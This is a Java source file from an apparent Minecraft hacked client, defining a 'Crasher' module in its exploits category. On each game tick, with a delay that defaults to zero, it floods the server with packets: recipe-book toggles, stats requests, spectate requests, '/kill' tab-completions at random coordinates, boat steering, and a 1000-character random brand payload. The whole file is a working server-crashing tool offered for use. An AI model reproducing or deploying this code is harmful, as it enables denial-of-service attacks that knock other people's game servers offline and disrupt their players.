package dev.zihasz.zware.features.module.exploit;

import dev.zihasz.zware.features.module.Category;
import dev.zihasz.zware.features.module.Module;
import dev.zihasz.zware.features.setting.Setting;
import dev.zihasz.zware.utils.misc.Timer;
import dev.zihasz.zware.utils.networking.PacketUtils;
import net.minecraft.network.play.client.*;
import net.minecraft.util.math.BlockPos;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.RandomUtils;

public class Crasher extends Module {

	public Crasher() {
		super("Crasher", "Crasher", Category.EXPLOITS);
	}

	private final Setting<Long> delay = new Setting<>("Delay", "Delay", 0L, 0L, 1000L);
	private final Timer timer = new Timer();

	@Override
	public void onUpdate() {
		if (timer.passedMS(delay.getValue())) {
			mc.player.connection.sendPacket(new CPacketRecipeInfo(mc.player.ticksExisted % 2 == 1, mc.player.ticksExisted % 2 == 0));
			mc.player.connection.sendPacket(new CPacketClientStatus(CPacketClientStatus.State.REQUEST_STATS));
			mc.player.connection.sendPacket(new CPacketSpectate(mc.player.getGameProfile().getId()));
			mc.player.connection.sendPacket(new CPacketTabComplete("/kill ", mc.player.getPosition().add(RandomUtils.nextInt(100, 1000), RandomUtils.nextInt(100, 1000), RandomUtils.nextInt(100, 1000)), mc.player.ticksExisted % 5 == 0));
			mc.player.connection.sendPacket(new CPacketSteerBoat(mc.player.ticksExisted % 2 == 1, mc.player.ticksExisted % 2 == 0));
			mc.player.connection.sendPacket(PacketUtils.generatePayload("MC|Brand", RandomStringUtils.random(1000)));
			timer.reset();
		}

	}
}
